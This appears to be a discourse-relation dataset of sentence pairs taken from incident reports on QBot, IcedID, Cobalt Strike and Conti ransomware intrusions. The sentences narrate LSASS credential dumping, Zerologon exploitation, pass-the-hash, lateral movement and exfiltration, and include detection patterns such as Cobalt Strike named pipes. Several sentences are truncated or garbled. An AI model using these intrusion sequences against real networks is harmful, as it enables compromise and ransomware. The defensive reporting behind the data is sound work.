        "relation": "ELABORATION"
    },
    {
        "S1": "The screenshot below shows the different \u201cDesiredAccess\u201d to the LSASS process object from different beacons (dllhost.exe, Edebef4.dll, etc.) or Task Manager:",
        "S2": "The table below maps the \u201cDesiredAccess\u201d values with the actual corresponding access rights, and examples of credentials dumping tools requesting those accesses:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The table below maps the \u201cDesiredAccess\u201d values with the actual corresponding access rights, and examples of credentials dumping tools requesting those accesses:",
        "S2": "*A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.",
        "relation": "MISC"
    },
    {
        "S1": "*A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.",
        "S2": "Those \u201cDesiredAccess\u201d values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool.",
        "relation": "MISC"
    },
    {
        "S1": "Those \u201cDesiredAccess\u201d values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool.",
        "S2": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "S2": "Multiple discovery techniques were observed throughout the case.",
        "relation": "MISC"
    },
    {
        "S1": "Multiple discovery techniques were observed throughout the case.",
        "S2": "The initial discovery techniques were conducted on the beachhead host by the IcedID malware \u2013 focusing on determining the system language and security products installed (T1518.001).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The initial discovery techniques were conducted on the beachhead host by the IcedID malware \u2013 focusing on determining the system language and security products installed (T1518.001).",
        "S2": "Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration.",
        "S2": "Discovery was achieved using a combination of living off the land techniques (WMIC and CMD) and via third-party tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Discovery was achieved using a combination of living off the land techniques (WMIC and CMD) and via third-party tools.",
        "S2": "Threat actors also used \u201cchcp\u201d for discovery of the system locale/language (T1614.001).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors also used \u201cchcp\u201d for discovery of the system locale/language (T1614.001).",
        "S2": "Change Control Page (ChCP) is a Microsoft utility for changing the console control page (language).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Change Control Page (ChCP) is a Microsoft utility for changing the console control page (language).",
        "S2": "In this case, the existing control page language was collected using the following command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the existing control page language was collected using the following command:",
        "S2": "As a test, entering this on a command prompt shows a numeric value.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As a test, entering this on a command prompt shows a numeric value.",
        "S2": "The Microsoft link shows the number of the language used (437 \u2013 United States).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Microsoft link shows the number of the language used (437 \u2013 United States).",
        "S2": "It is highly likely that the threat actors were establishing the country of origin based on the language used \u2013",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is highly likely that the threat actors were establishing the country of origin based on the language used \u2013",
        "S2": "an extra fail-safe check to ensure certain users or regions were not targeted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "an extra fail-safe check to ensure certain users or regions were not targeted.",
        "S2": "The >&2 parameter could indicate a parameter was expected as part of a script, or possibly a redirect using stderr.",
        "relation": "MISC"
    },
    {
        "S1": "The >&2 parameter could indicate a parameter was expected as part of a script, or possibly a redirect using stderr.",
        "S2": "The second discovery was from a different Cobalt Strike beacon \u201cFaicuy4.exe\u201d which focused on domain discovery and user groups using the net command.",
        "relation": "MISC"
    },
    {
        "S1": "The second discovery was from a different Cobalt Strike beacon \u201cFaicuy4.exe\u201d which focused on domain discovery and user groups using the net command.",
        "S2": "Once the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).",
        "S2": "\u2018adf.bat\u2019 is a common batch file that we have observed in previous cases, we saw this script in 2020 as part of a Ryuk intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u2018adf.bat\u2019 is a common batch file that we have observed in previous cases, we saw this script in 2020 as part of a Ryuk intrusion.",
        "S2": "The recent Conti leaks indicate that Conti operators were surprised Ryuk operators were using their file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The recent Conti leaks indicate that Conti operators were surprised Ryuk operators were using their file.",
        "S2": "The PowerView module Invoke-ShareFinder was executed from the beachhead host and a domain controller.",
        "relation": "LIST"
    },
    {
        "S1": "The PowerView module Invoke-ShareFinder was executed from the beachhead host and a domain controller.",
        "S2": "Some network discovery was conducted using the ping utility to check the existence of hosts on the network (T1049).",
        "relation": "LIST"
    },
    {
        "S1": "Some network discovery was conducted using the ping utility to check the existence of hosts on the network (T1049).",
        "S2": "Filesystem discovery (T1083) was conducted to collect directory lists to a text file.",
        "relation": "LIST"
    },
    {
        "S1": "Filesystem discovery (T1083) was conducted to collect directory lists to a text file.",
        "S2": "Other variations included:",
        "relation": "MISC"
    },
    {
        "S1": "Other variations included:",
        "S2": "On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL\u2019s onto a domain controller and another server.",
        "relation": "MISC"
    },
    {
        "S1": "On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL\u2019s onto a domain controller and another server.",
        "S2": "Services were then created on the hosts to execute the uploaded Cobalt Strike Beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "Services were then created on the hosts to execute the uploaded Cobalt Strike Beacons.",
        "S2": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "S2": "The beacons were then executed using a remote service.",
        "relation": "NEXT"
    },
    {
        "S1": "The beacons were then executed using a remote service.",
        "S2": "Known Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "Known Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons.",
        "S2": "Named pipes connections can be observed through Sysmon Event ID 18.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Named pipes connections can be observed through Sysmon Event ID 18.",
        "S2": "Note that the named pipes followed MSSE-[0-9]{4}-server pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note that the named pipes followed MSSE-[0-9]{4}-server pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:",
        "S2": "We observed the IcedID DLL dropping multiple CS beacons on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the IcedID DLL dropping multiple CS beacons on the beachhead.",
        "S2": "Threat actors used Splashtop Streamer via Atera agent, allowing them to remotely connect to machines without using RDP tunneling or other techniques previously seen in our cases.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors used Splashtop Streamer via Atera agent, allowing them to remotely connect to machines without using RDP tunneling or other techniques previously seen in our cases.",
        "S2": "By default, the Splashtop Streamer is automatically installed together with the AteraAgent.",
        "relation": "ELABORATION"
    },
    {
        "S1": "By default, the Splashtop Streamer is automatically installed together with the AteraAgent.",
        "S2": "Splashtop Streamer usage leaves many network connections to *.api.splashtop.com and *.relay.splashtop.com on port 443:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Splashtop Streamer usage leaves many network connections to *.api.splashtop.com and *.relay.splashtop.com on port 443:",
        "S2": "We observed a default Cobalt Strike malleable C2 profile, using the jquery agent string.",
        "relation": "MISC"
    },
    {
        "S1": "We observed a default Cobalt Strike malleable C2 profile, using the jquery agent string.",
        "S2": "This activity can be detected with relative ease by the ET rules.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity can be detected with relative ease by the ET rules.",
        "S2": "There appeared to be no jitter configured, resulting in a constant stream of HTTP requests, and if using ET rules, constant alerts would be generated.",
        "relation": "MISC"
    },
    {
        "S1": "There appeared to be no jitter configured, resulting in a constant stream of HTTP requests, and if using ET rules, constant alerts would be generated.",
        "S2": "Just based on the ET Cobalt Strike rule, \u2018ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\u2019, there were in excess of 6K alerts generated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Just based on the ET Cobalt Strike rule, \u2018ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\u2019, there were in excess of 6K alerts generated.",
        "S2": "Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers.",
        "relation": "MISC"
    },
    {
        "S1": "Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers.",
        "S2": "We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.",
        "S2": "A configuration was not obtained for this server.",
        "relation": "MISC"
    },
    {
        "S1": "A configuration was not obtained for this server.",
        "S2": "We did not observe any exfiltration indicators while analyzing host and network forensic artifacts.",
        "relation": "MISC"
    },
    {
        "S1": "We did not observe any exfiltration indicators while analyzing host and network forensic artifacts.",
        "S2": "This does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.",
        "S2": "On the 19th day of the intrusion, the threat actors prepared for their final objectives.",
        "relation": "MISC"
    },
    {
        "S1": "On the 19th day of the intrusion, the threat actors prepared for their final objectives.",
        "S2": "From the beachhead host, the directory listings of the domain controllers were checked again, followed by the backup server.",
        "relation": "MISC"
    },
    {
        "S1": "From the beachhead host, the directory listings of the domain controllers were checked again, followed by the backup server.",
        "S2": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "S2": "From that host however the attempt failed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From that host however the attempt failed.",
        "S2": "The threat actors then proceeded to look for other elevation paths.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then proceeded to look for other elevation paths.",
        "S2": "After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers.",
        "S2": "Once they established this access, around twenty minutes later, they again attempted the ransomware deployment and this time the payload executed properly and began spreading across the network via SMB.",
        "relation": "NEXT"
    },
    {
        "S1": "Once they established this access, around twenty minutes later, they again attempted the ransomware deployment and this time the payload executed properly and began spreading across the network via SMB.",
        "S2": "The threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.",
        "S2": "This x64.dll DLL contains fingerprints, \u201cconti_v3.dll\u201d, seen in our previous cases:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This x64.dll DLL contains fingerprints, \u201cconti_v3.dll\u201d, seen in our previous cases:",
        "S2": "We didn\u2019t dig into reversing this DLL, as a detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We didn\u2019t dig into reversing this DLL, as a detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware.",
        "S2": "Once the threat actors pushed the encryptor to C$, an excessive SMB network activity were generated in a short period of time (~7K) as indicated by the chart.",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actors pushed the encryptor to C$, an excessive SMB network activity were generated in a short period of time (~7K) as indicated by the chart.",
        "S2": "This resulted in files being encrypted and a \u2018readme.txt\u2019 ransom note generated on the hosts:",
        "relation": "NEXT"
    },
    {
        "S1": "This resulted in files being encrypted and a \u2018readme.txt\u2019 ransom note generated on the hosts:",
        "S2": "The ransom note has slightly been modified from our last Conti cases:",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL.",
        "S2": "The first activity of QBot was seen 5 minutes after the DLL was executed.",
        "relation": "NEXT"
    },
    {
        "S1": "The first activity of QBot was seen 5 minutes after the DLL was executed.",
        "S2": "Various automated discovery commands were used to",
        "relation": "NEXT"
    },
    {
        "S1": "Various automated discovery commands were used to",
        "S2": "Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence.",
        "relation": "NEXT"
    },
    {
        "S1": "Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence.",
        "S2": "Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N",
        "S2": "The executable named cool.exe to an empty string, retrieves the Domain Admin password Hash, and Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability.",
        "relation": "NEXT"
    },
    {
        "S1": "The executable named cool.exe to an empty string, retrieves the Domain Admin password Hash, and Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability.",
        "S2": "The executable used bears striking similarity to the one used in a previous case cool.exe to an empty string, retrieves the Domain Admin password Hash, and",
        "relation": "ELABORATION"
    },
    {
        "S1": "The executable used bears striking similarity to the one used in a previous case cool.exe to an empty string, retrieves the Domain Admin password Hash, and",
        "S2": "The domain admin hash was then used on the beachhead through an over-pass-the-hash attack .",
        "relation": "NEXT"
    },
    {
        "S1": "The domain admin hash was then used on the beachhead through an over-pass-the-hash attack .",
        "S2": "After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.",
        "relation": "NEXT"
    },
    {
        "S1": "After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.",
        "S2": ".",
        "relation": "MISC"
    },
    {
        "S1": ".",
        "S2": "To conclude this case, the threat actors were evicted from the network before they completed any further objectives.",
        "relation": "MISC"
    },
    {
        "S1": "To conclude this case, the threat actors were evicted from the network before they completed any further objectives.",
        "S2": ".",
        "relation": "MISC"
    },
    {
        "S1": ".",
        "S2": "The threat actor gained their initial access through the execution of a malicious DLL.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained their initial access through the execution of a malicious DLL.",
        "S2": "Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL.",
        "S2": "In this case, however, the execution started directly from the qbot DLL found here",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, however, the execution started directly from the qbot DLL found here",
        "S2": "The execution chain for this QBot infection can be seen below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The execution chain for this QBot infection can be seen below:",
        "S2": "We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values.",
        "relation": "MISC"
    },
    {
        "S1": "We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values.",
        "S2": "Decoding the values resulted in:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Decoding the values resulted in:",
        "S2": "- Copy of QBot DLL",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Copy of QBot DLL",
        "S2": "- obfuscated PowerShell script that is referenced by the scheduled task.",
        "relation": "LIST"
    },
    {
        "S1": "- obfuscated PowerShell script that is referenced by the scheduled task.",
        "S2": "The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:",
        "relation": "NEXT"
    },
    {
        "S1": "The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:",
        "S2": "When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution.",
        "S2": "It then verifies upon execution if the creation date key of this registry key is older than 4 hours.",
        "relation": "NEXT"
    },
    {
        "S1": "It then verifies upon execution if the creation date key of this registry key is older than 4 hours.",
        "S2": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "S2": "OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module:",
        "relation": "IF_ELSE"
    },
    {
        "S1": "OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module:",
        "S2": "The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.",
        "relation": "MISC"
    },
    {
        "S1": "The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.",
        "S2": "The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu .",
        "relation": "MISC"
    },
    {
        "S1": "The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu .",
        "S2": "The unsigned DLL, with descriptor Cancel Autoplay 2 was executed using regsvr32.exe",
        "relation": "NEXT"
    },
    {
        "S1": "The unsigned DLL, with descriptor Cancel Autoplay 2 was executed using regsvr32.exe",
        "S2": "Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc.",
        "S2": "In addition, a new instance of explorer.exe (32-bit) was started and injected into.",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, a new instance of explorer.exe (32-bit) was started and injected into.",
        "S2": "The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config.",
        "relation": "MISC"
    },
    {
        "S1": "The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config.",
        "S2": "The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.",
        "relation": "MISC"
    },
    {
        "S1": "The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.",
        "S2": "Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.",
        "relation": "MISC"
    },
    {
        "S1": "Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.",
        "S2": "Three milliseconds after the exploit, an event 4742 \u201cA computer account was changed.\u201d was generated on the targeted Domain Controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Three milliseconds after the exploit, an event 4742 \u201cA computer account was changed.\u201d was generated on the targeted Domain Controller.",
        "S2": "As explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV :",
        "relation": "ELABORATION"
    },
    {
        "S1": "As explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV :",
        "S2": "\u201cIn order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cIn order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key.",
        "S2": "However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes.",
        "S2": "This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256.",
        "S2": "Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default).",
        "relation": "MISC"
    },
    {
        "S1": "Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default).",
        "S2": "The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\u201d",
        "S2": "As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller :",
        "relation": "MISC"
    },
    {
        "S1": "As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller :",
        "S2": "After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully.",
        "relation": "NEXT"
    },
    {
        "S1": "After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully.",
        "S2": "After being successfully authenticated, the DC password was set:",
        "relation": "MISC"
    },
    {
        "S1": "After being successfully authenticated, the DC password was set:",
        "S2": "We can also see that the SubjectUserName is ANONYMOUS LOGON.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We can also see that the SubjectUserName is ANONYMOUS LOGON.",
        "S2": "After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.",
        "relation": "MISC"
    },
    {
        "S1": "After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.",
        "S2": "The explorer shell was also restarted by the threat actor:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The explorer shell was also restarted by the threat actor:",
        "S2": "Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.",
        "relation": "MISC"
    },
    {
        "S1": "Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.",
        "S2": "The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit).",
        "relation": "NEXT"
    },
    {
        "S1": "The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit).",
        "S2": "An example event can be seen below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example event can be seen below.",
        "S2": "Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.",
        "relation": "MISC"
    },
    {
        "S1": "Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.",
        "S2": "The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash We have seen the use of over-pass-the-hash several times before.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash We have seen the use of over-pass-the-hash several times before.",
        "S2": "For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.",
        "S2": "Soon after, a TGT for the administrator account was requested:",
        "relation": "MISC"
    },
    {
        "S1": "Soon after, a TGT for the administrator account was requested:",
        "S2": "QBot initially starts a number of processes to collect information about the affected system.",
        "relation": "MISC"
    },
    {
        "S1": "QBot initially starts a number of processes to collect information about the affected system.",
        "S2": "This is part of the \u201cSYSTEM INFO\u201d bot request, as described in a recent article from SecureList.",
        "relation": "MISC"
    },
    {
        "S1": "This is part of the \u201cSYSTEM INFO\u201d bot request, as described in a recent article from SecureList.",
        "S2": "Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.",
        "S2": "Ping was used to verify machines were online",
        "relation": "NEXT"
    },
    {
        "S1": "Ping was used to verify machines were online",
        "S2": "Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.",
        "S2": "Multiple services were installed by Cobalt Strike across the environment, here are a few examples:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Multiple services were installed by Cobalt Strike across the environment, here are a few examples:",
        "S2": "first calls to create the service remotely, then starts it with StartServiceA function:",
        "relation": "ELABORATION"
    },
    {
        "S1": "first calls to create the service remotely, then starts it with StartServiceA function:",
        "S2": "RDP/interactive Logins",
        "relation": "MISC"
    },
    {
        "S1": "RDP/interactive Logins",
        "S2": "Increase the max RDP connections allowed, in this case a arbitrarily large number.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Increase the max RDP connections allowed, in this case a arbitrarily large number.",
        "S2": "Makes sure the RDP listener is enabled.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure the RDP listener is enabled.",
        "S2": "Makes sure the user is allowed to RDP to the terminal server.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure the user is allowed to RDP to the terminal server.",
        "S2": "Makes sure the terminal server is set to enabled.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure the terminal server is set to enabled.",
        "S2": "Makes sure terminal services is set to remote admin mode.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure terminal services is set to remote admin mode.",
        "S2": "Makes sure that the terminal service will start idle sessions.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure that the terminal service will start idle sessions.",
        "S2": "Enables advertisement of the terminal server.",
        "relation": "LIST"
    },
    {
        "S1": "Enables advertisement of the terminal server.",
        "S2": "Makes sure terminal server is set to allow connections.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure terminal server is set to allow connections.",
        "S2": "Makes sure terminal server is set to simultaneous sessions.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure terminal server is set to simultaneous sessions.",
        "S2": "Makes sure multiple sessions are allowed.",
        "relation": "LIST"
    },
    {
        "S1": "Makes sure multiple sessions are allowed.",
        "S2": "Starts the terminal services and sets service to autostart.",
        "relation": "LIST"
    },
    {
        "S1": "Starts the terminal services and sets service to autostart.",
        "S2": "The base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe \u201cdce_3d\u201d",
        "relation": "MISC"
    },
    {
        "S1": "The base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe \u201cdce_3d\u201d",
        "S2": ".",
        "relation": "MISC"
    },
    {
        "S1": ".",
        "S2": "Here is the initial access DLL (Qbot) information from Tria.ge",
        "relation": "MISC"
    },
    {
        "S1": "Here is the initial access DLL (Qbot) information from Tria.ge",
        "S2": "While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165.",
        "relation": "MISC"
    },
    {
        "S1": "While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165.",
        "S2": "These alerts tell us that data was indeed exfiltrated from the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These alerts tell us that data was indeed exfiltrated from the environment.",
        "S2": "The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.",
        "S2": "The C2 channel was encrypted and multiple connections were established with the internal file server.",
        "relation": "MISC"
    },
    {
        "S1": "The C2 channel was encrypted and multiple connections were established with the internal file server.",
        "S2": "No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.",
        "S2": "At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.",
        "relation": "MISC"
    },
    {
        "S1": "At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.",
        "S2": "Spike in traffic from file share server to Cobalt Strike command and control server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We did not observe the initial access for this case but assess with medium to high confidence that a malicious email campaign was used to deliver an Excel (xls) document.",
        "S2": "Following the opening of the xls document, the initial Qbot DLL loader was downloaded and saved to disk.",
        "relation": "NEXT"
    },
    {
        "S1": "Following the opening of the xls document, the initial Qbot DLL loader was downloaded and saved to disk.",
        "S2": "Interestingly, the name of the DLL contained a .html extension to disguise the portable executable nature of the payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, the name of the DLL contained a .html extension to disguise the portable executable nature of the payload.",
        "S2": "Once executed, the Qbot process creates a scheduled task to elevate itself to system.",
        "relation": "MISC"
    },
    {
        "S1": "Once executed, the Qbot process creates a scheduled task to elevate itself to system.",
        "S2": "Qbot injected into many processes but one favorite in this intrusion, was Microsoft Remote Assistance (msra.exe).",
        "relation": "NEXT"
    },
    {
        "S1": "Qbot injected into many processes but one favorite in this intrusion, was Microsoft Remote Assistance (msra.exe).",
        "S2": "Within minutes of landing on the beachhead, a series of discovery commands were executed using Microsoft utilities.",
        "relation": "NEXT"
    },
    {
        "S1": "Within minutes of landing on the beachhead, a series of discovery commands were executed using Microsoft utilities.",
        "S2": "Around the same time, LSASS was access by Qbot to collect credentials from memory.",
